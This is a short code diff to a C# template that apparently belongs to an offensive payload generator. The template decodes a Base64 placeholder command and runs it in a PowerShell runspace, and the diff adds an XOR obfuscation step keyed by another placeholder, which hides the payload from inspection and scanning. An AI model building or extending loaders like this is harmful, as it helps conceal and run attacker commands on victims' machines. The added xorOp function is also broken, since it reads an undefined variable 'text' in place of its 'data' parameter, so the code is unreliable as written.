@@ -23,6 +23,7 @@ Cool.DoStuff();
  {
  
  string command = Base64Decode($$$ENCODED$$$);
+ command = xorOp(command, $$$XORKEY$$$);
  RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
  Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
  rspace.Open();
@@ -36,4 +37,15 @@ public static string Base64Decode(string base64EncodedData) {
   byte[] base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
   return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
 }
+
+public static string xorOp(string data, string key)
+{
+    var result = new StringBuilder();
+
+    for (int c = 0; c < text.Length; c++)
+        result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));
+
+    return result.ToString();
+}
+
  }
